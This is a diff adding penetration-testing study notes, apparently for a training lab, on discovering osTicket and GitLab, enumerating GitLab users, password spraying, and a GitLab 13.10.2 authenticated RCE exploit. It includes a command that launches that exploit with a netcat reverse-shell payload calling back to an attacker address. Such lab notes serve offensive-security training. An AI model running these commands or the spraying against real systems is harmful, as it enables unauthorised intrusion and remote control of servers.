@@ -635,3 +635,37 @@ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7
 - Default creds ```prtgadmin:prtgadmin```
 - Try weak passwords for ```prtgadmin```
 - Try know exploits for version
+
+## osTicket
+
+### Footprinting/Discovery/Enumeration
+
+- Can show up in Eyewitness report which can contain ```OSTSESSID``` cookie
+- Page footers may show "powered by osTicket" or "Support Ticket System"
+- Will not show up in nmap scan
+
+## Gitlab
+
+### Discovery & Enumeration
+
+- Browse to ```gitlab.<domain>``` to discover if a gitlab instance is running
+- Try registering an account or signing in with other found credentials/try low risk exploit such as [this](https://www.exploit-db.com/exploits/49821) or its [python3 version](https://github.com/dpgg101/GitLabUserEnum)
+- Can also use the registration form to enumerate valid users ```/users/sign_up``` will show already taken usernames
+- Browse to ```/help``` to discover version number
+- Once logged in browse to ```/explore``` to dig through public projects for anything of interest
+- Check the other tabs ```groups```, ```snippets```, and ```help```
+
+### Attacking GitLab
+
+#### Username Enumeration/Password Spray
+
+- 10 minute lockout after 10 failed login attempts by default
+- Controlled password spray with weak passwords against found usernames
+
+### Authenticated Remote Code Execution
+
+- [Exploit](https://www.exploit-db.com/exploits/49951) for GitLab Community Edition version 13.10.2 and lower
+- Requires valid username and password (may work with self-registered credentials)
+```bash
+python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u Testface -p Testface -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+```
